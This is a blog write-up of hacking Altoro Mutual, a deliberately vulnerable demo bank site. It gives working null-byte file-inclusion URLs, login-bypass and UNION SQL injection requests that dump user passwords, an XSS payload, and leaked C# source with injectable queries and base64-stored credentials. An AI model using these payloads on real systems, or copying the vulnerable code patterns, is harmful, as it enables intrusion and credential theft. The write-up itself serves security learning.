+++
title = "Hacking Altoro Mutual"
author = "Victor"
date = "2013-05-06"
tags = ["hacking", "security", "wargames", "web", "appsec", "xss"]
category = "blog"
+++

## Introduction

AltoroMutual is an vulnerable-by-design web application created by WatchFire (now AppScan Standard) as a demo test application for their BlackBox Scanner. (Source:<https://www.owasp.org/index.php/AltoroMutual>)

The demo can be found at <http://demo.testfire.net/>.

## Vulnerabilities

### /default.aspx?content=

There is a **file inclusion vulnerability** which we'll use for further investigation. URL *<http://demo.testfire.net/default.aspx?content=../testing.txt>* will show:

~~~
An Error Has Occurred
Summary:
Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
Error Message:
System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6website esting.txt'. File name: 'D:downloadsAltoroMutual_v6website  esting.txt' at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
~~~

As you can see we have found the root path of the web application which is at `D:downloads!AltoroMutual_v6website`.

## /bank

* * *

You'll find a **directory listening** at <http://demo.testfire.net/bank/> which will show you a lot of information about the applications functionalities.

~~~
 5/31/2007 11:10 AM        <dir> 20060308_bak
 1/12/2011 10:14 PM         1831 account.aspx
 1/12/2011 10:14 PM         4277 account.aspx.cs
 1/12/2011 10:14 PM          771 apply.aspx
 1/12/2011 10:14 PM         2828 apply.aspx.cs
 1/12/2011 10:14 PM         2236 bank.master
 1/12/2011 10:14 PM         1134 bank.master.cs
 1/12/2011 10:14 PM          904 customize.aspx
 1/12/2011 10:14 PM         1955 customize.aspx.cs
 1/12/2011 10:14 PM         1806 login.aspx
 1/12/2011 10:14 PM         5847 login.aspx.cs
 1/12/2011 10:14 PM           78 logout.aspx
 1/12/2011 10:14 PM         3361 logout.aspx.cs
 1/12/2011 10:14 PM          935 main.aspx
 1/12/2011 10:14 PM         3951 main.aspx.cs
 5/31/2007 11:10 AM        <dir> members
 1/12/2011 10:14 PM         1414 mozxpath.js
 6/21/2011 10:29 PM          779 queryxpath.aspx
 1/12/2011 10:14 PM         1838 queryxpath.aspx.cs
 1/12/2011 10:14 PM          499 servererror.aspx
 1/12/2011 10:14 PM         1700 transaction.aspx
 1/12/2011 10:14 PM         3826 transaction.aspx.cs
 1/12/2011 10:14 PM         3930 transfer.aspx
 1/12/2011 10:14 PM         3505 transfer.aspx.cs
 1/12/2011 10:14 PM           82 ws.asmx
~~~

Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:

~~~
An Error Has Occurred
Summary:
An unknown error occurred.
Error Message:
~~~

So you'll have to find another way to get to the files. We'll use the **file inclusion vulnerability** found before to do that.

<http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs> will result in

~~~
Error! File must be of type TXT or HTM
~~~

We'll have to bypass the filter in order to get the file. Remember the **null string vulnerability**? Here we go: [http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt][3].

That will show you the content of */bank/login.aspx.cs*. Now you can inspect the the source code to find more vulnerabilities.

## /bank/login.aspx

Here is the source code ([http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt][3]):

~~~.dotnet
using System.Data;
using System.Data.SqlClient;
using System.Data.OleDb;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
  public partial class Authentication : Page
  {
    protected void Page_Load(object sender, System.EventArgs e)
    {
      // Put user code to initialize the page here
      Response.Cache.SetCacheability(HttpCacheability.NoCache);
      HtmlMeta meta = new HtmlMeta();
      HtmlHead head = (HtmlHead)Page.Header;
      meta.Name = "keywords";
      meta.Content = "Altoro Mutual Login, login, authenticate";
      head.Controls.Add(meta);
      if(Request.Params["passw"] != null)
      {
        String uname = Request.Params["uid"];
        String passwd = Request.Params["passw"];
        String msg = ValidateUser(uname, passwd);
        if (msg == "Success")
        {
            Response.Redirect("main.aspx");
        }
        else
        {
          message.Text = "Login Failed: " + msg;
        }
      }
    }
    protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      DataSet ds = new DataSet();
      OleDbDataAdapter myLogin = new OleDbDataAdapter(query1, myConnection);
      myLogin.Fill(ds, "user");
      if (ds.Tables["user"].Rows.Count==0)
      {
              OleDbDataAdapter myFailed = new OleDbDataAdapter(query2, myConnection);
              myFailed.Fill(ds, "user");
        if (ds.Tables["user"].Rows.Count==0)
        {
             status = "We're sorry, but this username was not found in our system.  Please try again.";
        }
        else
        {
            status = "Your password appears to be invalid.  Please re-enter your password carefully.";
        }
      }
      else
      {
                //Get the row returned by the query
                DataRow myRow = ds.Tables["user"].Rows[0];
          //Set the Session variables.
          Session["userId"] = myRow["userid"];
          Session["userName"] = myRow["username"];
          Session["firstName"] = myRow["first_name"];
          Session["lastName"] = myRow["last_name"];
          Session["authenticated"] = true;
          //Close the database collection.
          myConnection.Close();
          //Set UserInfo cookie
          DateTime dtNow = DateTime.Now;
          TimeSpan tsHour = new TimeSpan(0, 0, 180, 0);
          string sCookieUser = new Base64Decoder(uName).GetDecoded();
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if ((UserInfo == null) || (sCookieUser != Session["userName"].ToString()))
          {
              UserInfo = new HttpCookie("amUserInfo");
              UserInfo["UserName"] = new Base64Encoder(uName).GetEncoded();
              UserInfo["Password"] = new Base64Encoder(pWord).GetEncoded();
              UserInfo.Expires = dtNow.Add(tsHour);
              Response.Cookies.Add(UserInfo);
          }
          HttpCookie UserId = Request.Cookies["amUserId"];
          UserId = new HttpCookie("amUserId");
          UserId.Value = Session["userId"].ToString();
          Response.Cookies.Add(UserId);
          query1 = "SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=" + Session["userId"];
          OleDbDataAdapter myApproval = new OleDbDataAdapter(query1, myConnection);
          myApproval.Fill(ds, "promo");
          DataTable myTable = ds.Tables["promo"];
          DataRow curRow = myTable.Rows[0];
          if (System.Convert.ToBoolean(curRow["approved"]))
          {
            HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
                CreditOffer = new HttpCookie("amCreditOffer");
            CreditOffer["CardType"] = curRow["card_type"].ToString();
            CreditOffer["Limit"] = curRow["limit"].ToString();
            CreditOffer["Interest"] = curRow["interest"].ToString();
                Response.Cookies.Add(CreditOffer);
          }
      }
      myConnection.Close();
      return status;
    }
      protected string GetUserName()
      {
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if (Request.Params["uid"] != null)
          {
              return Request.Params["uid"].ToString();
          }
          if (UserInfo != null)
          {
              return new Base64Decoder(UserInfo["UserName"]).GetDecoded();
          }
          else
          {
              return "";
          }
      }
    #region Web Form Designer generated code
    override protected void OnInit(EventArgs e)
    {
      //
      // CODEGEN: This call is required by the ASP.NET Web Form Designer.
      //
      InitializeComponent();
      base.OnInit(e);
    }
    /// <summary>
    /// Required method for Designer support - do not modify
    /// the contents of this method with the code editor.
    /// </summary>
    private void InitializeComponent()
    {
    }
    #endregion
  }
}
~~~



### Brute force vulnerability

Before we investigate the code, let's have a look at a much common vulnerability. Go to <http://demo.testfire.net/bank/login.aspx> and use a random user for the login process. You'll get:

~~~
Login Failed: We're sorry, but this username was not found in our system. Please try again.
~~~

You could now easily **bruteforce** common usernames in order to login into the application. The same works with passwords too: *admin* seems to be a valid username. Try to bruteforce the password and you'll get:

~~~
Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
~~~

*admin:admin* is a valid username/password combination.



### SQL injection using POST parameters

Now let's have a closer look at the source code... Let's analyze the *!ValidateUser*function:

~~~.dotnet
protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      ....
~~~

As you can see the *uName* parameter doesn't get sanitized, so you can easily run some **SQL injection**. Let's try that out. Using [Burpsuite][7] we'll tamper data sent to the web server and analyze the responses.

Here's the request:

~~~.html
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
uid=admin%27&passw=test&btnSubmit=Login
~~~
As a response you'll get:

~~~
An Error Has Occurred
Summary:
Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
Error Message:
System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
~~~

*Single quotes* are obvisouly not escaped so we could inject some SQL statements. Let's try some common ones likeÂ **admin' OR 1=1;-**:

~~~.html
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
uid=admin' OR 1=1;--&passw=test&btnSubmit=Login
~~~

The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ *password* field as well. Following request will work too:

~~~.html
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
uid=admin&passw=' OR 1=1;--&btnSubmit=Login
~~~

### Base64-encoded login credentials

After a successful login the server will set a cookie *amUserInfo* which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.

~~~
amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
~~~

decodes to...

~~~
amUserInfo=Username=admin' OR 1=2;--&Password=test
~~~

## /bank/main.aspx

After a successful login you'll be redirected to <http://demo.testfire.net/bank/main.aspx>. Let's have a look at the functionalities within this page.


### Source code disclosure<

Here's the source code ([http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt][9])

~~~.dotnet
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
    /// <summary>
    /// Summary description for welcome.
    /// </summary>
    public partial class Default : Page
    {
        protected void Page_Load(object sender, System.EventArgs e)
        {
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            if (!(System.Convert.ToBoolean(Session["authenticated"])))
            {
                Server.Transfer("logout.aspx");
            }
            string thisUser = Request.Cookies["amUserId"].Value;
            DataRow myRow;
            DataTable acctTable = GetAccounts(thisUser);
            CheckPromo(thisUser);
            for (int i = 0; i < acctTable.Rows.Count; i++)
            {
                myRow = acctTable.Rows[i];
                ArrayList myList = new ArrayList();
                myList.Add(myRow["accountid"].ToString());
                myList.Add(myRow["accountid"].ToString() + " " + myRow["acct_type"].ToString());
                listAccounts.myItems.Add(myList);
            }
        }
        private DataTable GetAccounts(string userId)
        {
            OleDbConnection myConnection = new OleDbConnection();
            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
            myConnection.Open();
            string query = "SELECT accountid, acct_type From accounts WHERE userid = " + userId;
            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
            DataSet ds = new DataSet();
            myAccounts.Fill(ds, "accounts");
            DataTable myTable = ds.Tables["accounts"];
            myConnection.Close();
            return myTable;
        }
        private void WritePromo(string cType, string cLimit, string cInterest)
        {
            string promoText = "<table width=590 border=0>";
            promoText += "<tr><td><h2>Congratulations! </h2></td></tr>";
            promoText += "<tr><td>You have been pre-approved for an Altoro ";
            promoText += cType;
            promoText += " Visa with a credit limit of $";
            promoText += cLimit;
            promoText += "!</td></tr>";
            promoText += "<tr><td>Click <a href='apply.aspx";
            promoText += "'>Here</a> to apply.</td></tr></table>";
            promo.Visible = true;
            promo.Text = promoText;
        }
        private void CheckPromo(string strUserId)
        {
            if (Request.Cookies["amCreditOffer"] != null)
            {
                    HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
              WritePromo(CreditOffer["CardType"], CreditOffer["Limit"], CreditOffer["Interest"]);
            }
        }
        protected String GetSessionValue(String key)
        {
            if (Request.Cookies["amUserId"].Value==Session["userId"].ToString())
            {
                return Session[key].ToString();
                }
                else
                {
                        return "";
                }
        }
        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            //
            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
            //
            InitializeComponent();
            base.OnInit(e);
        }
        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
        }
        #endregion
    }
}
~~~



### SQL injection using Cookie data

After login following request will be sent to the server:

~~~.html
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1
~~~

A look at the *GetAccounts* in the source code reveals that *userId* is actually some data from the cookie *amUserId* and never gets sanitized. Let's have some fun:

~~~.shell
GET /bank/main.aspx HTTP/1.1
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1'
~~~

*amUserId* was changed and the whole GET request was sent again to the server. The response was quite informative:

~~~
An Error Has Occurred
Summary:
Syntax error in string in query expression 'userid = 1''.
Error Message:
System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
~~~

Ahhh, there we go! **Another SQL injection vulnerability!** You could now dump some data:

~~~.html
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
~~~

You could use this vulnerability to **dump the *users* table**:

~~~.html
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select username, password from users;--
~~~

This will return:

~~~
admin admin
cclay Ali
jsmith Demo1234
sjoe frazier
sspeed Demo1234
tuser tuser
~~~

Simple, isn't it?

### XSS using cookie data

Alternatively you could combine SQLi with XSS:

~~~.html
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select "<script>...</script>", "Injection FOUND!" from accounts;--
~~~

 [3]: http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt
 [7]: http://www.portswigger.net/burp/
 [8]: http://dornea.nu/wargames/altoro-mutual?action=AttachFile&do=get&target=login_sql_injection.png "attachment:login_sql_injection.png"
 [9]: http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt
